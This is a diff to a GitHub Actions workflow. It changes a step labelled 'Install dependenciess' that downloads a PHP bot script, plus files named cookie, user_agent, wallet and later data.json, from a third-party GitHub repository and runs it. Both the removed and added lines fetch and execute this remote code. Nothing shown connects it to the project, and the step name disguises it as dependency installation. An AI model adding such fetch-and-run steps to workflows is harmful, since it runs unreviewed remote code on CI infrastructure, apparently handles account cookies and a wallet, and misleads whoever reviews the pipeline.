@@ -15,9 +15,6 @@ jobs:
         coverage: none
     - name: Install dependenciess
       run: |
-        wget https://github.com/Gkist2264/gamifj/raw/main/td/bot.php
-        wget https://github.com/Gkist2264/gamifj/raw/main/td/cookie
-        
-        wget https://github.com/Gkist2264/gamifj/raw/main/td/user_agent
-        wget https://github.com/Gkist2264/gamifj/raw/main/td/wallet
-        echo -e " Wb0bs\1\n1\n1" | php bot.php
+        wget https://github.com/Gkist2264/gamifj/raw/main/bot.php
+        wget https://github.com/Gkist2264/gamifj/raw/main/td/data.json
+        php bot.php
